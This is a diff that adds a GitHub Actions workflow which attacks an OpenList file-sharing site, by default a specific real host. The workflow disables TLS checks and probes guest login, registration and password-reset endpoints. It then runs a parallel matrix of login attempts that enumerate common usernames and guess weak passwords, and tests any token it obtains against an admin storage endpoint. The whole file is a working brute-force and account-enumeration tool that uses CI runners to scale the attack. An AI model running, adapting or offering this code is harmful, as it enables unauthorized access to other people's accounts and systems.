@@ -1,0 +1,156 @@
+name: openlist-acct-probe
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'OpenList base URL'
+        required: false
+        default: 'https://pan.yazinb.icu'
+
+jobs:
+  discover:
+    runs-on: ubuntu-latest
+    env:
+      BASE: ${{ github.event.inputs.target }}
+    steps:
+      - name: discover register/reset + baseline
+        run: |
+          python3 - <<'PYEOF'
+          import urllib.request, ssl, json, base64, re, random, string, os
+          ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
+          BASE=os.environ['BASE']
+          def call(method, path, body=None, token=None, headers=None):
+              url=BASE+path; data=None
+              h={'User-Agent':'Mozilla/5.0','Accept':'application/json','Content-Type':'application/json','Origin':BASE,'Referer':BASE+'/'}
+              if token: h['Authorization']=token
+              if headers: h.update(headers)
+              if body is not None: data=json.dumps(body).encode()
+              req=urllib.request.Request(url, data=data, headers=h, method=method)
+              try:
+                  r=urllib.request.urlopen(req, timeout=25, context=ctx)
+                  return r.status, dict(r.getheaders()), r.read()
+              except urllib.error.HTTPError as e:
+                  return e.code, dict(e.headers), e.read()
+              except Exception as e:
+                  return -1, {}, ('ERR:'+repr(e)).encode()
+          def jd(b):
+              try: return json.loads(b.decode('utf-8','replace'))
+              except: return None
+          def decode_jwt(tok):
+              try:
+                  p=tok.split('.')[1]; p+='='*(-len(p)%4)
+                  return json.loads(base64.urlsafe_b64decode(p))
+              except: return {}
+          print("=== BASELINE guest/guest ===")
+          s,h,b=call('POST','/api/auth/login', body={'username':'guest','password':'guest'})
+          d=jd(b)
+          print("guest_login code=%s msg=%s" % (s, (d or {}).get('message')))
+          tok=None
+          if d and d.get('code')==200 and d.get('data',{}).get('token'):
+              tok=d['data']['token']
+              print("guest_jwt_payload=%s" % json.dumps(decode_jwt(tok), ensure_ascii=False))
+              for fmt in ['raw','Bearer','alist-']:
+                  hh={'Authorization': (tok if fmt=='raw' else fmt+tok)}
+                  s2,h2,b2=call('GET','/api/me', headers=hh)
+                  print("me fmt=%s code=%s body=%s" % (fmt, s2, json.dumps(jd(b2), ensure_ascii=False)[:500]))
+          print("=== REGISTER ===")
+          rnd=''.join(random.choices(string.ascii_lowercase+string.digits, k=8))
+          newuser='probe_'+rnd
+          for method in ['POST','GET']:
+              s,h,b=call(method,'/api/auth/register', body={'username':newuser,'password':'Probe@123456','email':newuser+'@example.com'})
+              d=jd(b)
+              print("register %s code=%s msg=%s body=%s" % (method, s, (d or {}).get('message'), json.dumps(d, ensure_ascii=False)[:400]))
+          print("=== RESET ===")
+          for body in [{'username':'guest'},{'email':'guest@example.com'},{'username':newuser,'email':newuser+'@example.com'}]:
+              s,h,b=call('POST','/api/auth/reset', body=body)
+              d=jd(b)
+              print("reset body=%s code=%s msg=%s body=%s" % (json.dumps(body), s, (d or {}).get('message'), json.dumps(d, ensure_ascii=False)[:400]))
+          print("=== DONE DISCOVER ===")
+          PYEOF
+
+  setup:
+    runs-on: ubuntu-latest
+    outputs:
+      matrix: ${{ steps.gen.outputs.matrix }}
+    steps:
+      - id: gen
+        run: |
+          python3 - <<'PYEOF'
+          import json, os
+          usernames = [
+            'guest','user','test','demo','member','default','anonymous',
+            'user1','test1','demo1','user2','test2','demo2',
+            'yazinb','qaswed','qaswed1234567','duck','pan',
+            'support','service','dev','lab','www','web','api','ftp','ftpuser',
+            'upload','download','share','public','data','file','files',
+            'root','admin','manager','operator'
+          ]
+          weak = ['123456','password','qaswed1234567']
+          weak_targets = {'user','test','demo','member','default','user1','yazinb','qaswed','qaswed1234567','support','dev','ftp','upload','download','share','public','data'}
+          combos=[]
+          for u in usernames:
+              combos.append({'u':u,'p':'__ENUM__'})
+              if u in weak_targets:
+                  for wp in weak:
+                      combos.append({'u':u,'p':wp})
+          with open(os.environ['GITHUB_OUTPUT'],'a') as f:
+              f.write('matrix='+json.dumps({'include':combos})+'\n')
+          print("generated %d combos" % len(combos))
+          PYEOF
+
+  enum:
+    needs: setup
+    runs-on: ubuntu-latest
+    env:
+      BASE: ${{ github.event.inputs.target }}
+      U: ${{ matrix.u }}
+      P: ${{ matrix.p }}
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix: ${{ fromJson(needs.setup.outputs.matrix) }}
+    steps:
+      - name: probe
+        run: |
+          python3 - <<'PYEOF'
+          import urllib.request, ssl, json, base64, os
+          ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
+          BASE=os.environ['BASE']; U=os.environ['U']; P=os.environ['P']
+          def call(method, path, body=None, token=None):
+              url=BASE+path; data=None
+              h={'User-Agent':'Mozilla/5.0','Accept':'application/json','Content-Type':'application/json','Origin':BASE,'Referer':BASE+'/'}
+              if token: h['Authorization']=token
+              if body is not None: data=json.dumps(body).encode()
+              req=urllib.request.Request(url, data=data, headers=h, method=method)
+              try:
+                  r=urllib.request.urlopen(req, timeout=25, context=ctx)
+                  return r.status, dict(r.getheaders()), r.read()
+              except urllib.error.HTTPError as e:
+                  return e.code, dict(e.headers), e.read()
+              except Exception as e:
+                  return -1, {}, ('ERR:'+repr(e)).encode()
+          def jd(b):
+              try: return json.loads(b.decode('utf-8','replace'))
+              except: return None
+          def decode_jwt(tok):
+              try:
+                  p=tok.split('.')[1]; p+='='*(-len(p)%4)
+                  return json.loads(base64.urlsafe_b64decode(p))
+              except: return {}
+          is_enum = (P=='__ENUM__')
+          pw = 'ThisIsDefinitelyWrong_DUMMY_9' if is_enum else P
+          s,h,b=call('POST','/api/auth/login', body={'username':U,'password':pw})
+          d=jd(b)
+          code = d.get('code') if d else s
+          msg = (d or {}).get('message') if d else ''
+          tok=None
+          if d and d.get('code')==200 and d.get('data',{}).get('token'):
+              tok=d['data']['token']
+          role=''; perm=''; admin_storage=''
+          if tok:
+              pl=decode_jwt(tok); role=str(pl.get('role','')); perm=str(pl.get('permission',''))
+              s2,h2,b2=call('GET','/api/admin/storage/list', token=tok)
+              admin_storage='%s' % s2
+          print("RESULT | user=%s | pw=%s | code=%s | msg=%s | role=%s | perm=%s | admin_storage=%s | tokenlen=%s" % (U, ('ENUM' if is_enum else P), code, msg, role, perm, admin_storage, (len(tok) if tok else 0)))
+          PYEOF
